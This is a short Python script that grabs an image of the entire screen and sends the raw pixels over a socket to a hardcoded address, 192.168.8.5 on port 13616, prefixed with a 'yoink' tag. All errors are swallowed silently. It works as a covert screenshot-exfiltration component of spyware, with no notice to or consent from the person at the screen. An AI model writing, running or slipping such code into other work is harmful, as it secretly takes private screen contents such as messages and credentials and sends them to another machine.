from PIL import ImageGrab
import socket
import sys
import time

try:
    im = ImageGrab.grab()
    data = im.tobytes()
    s = socket.socket()
    s.connect(('192.168.8.5', 13616))
    screensize = im.size
    screensize = str(screensize[0]) + '_' + str(screensize[1])
    s.send(b'yoink' + screensize.encode())
    time.sleep(0.5)
    s.send(data)
    s.close()
    sys.exit()
except:
    sys.exit()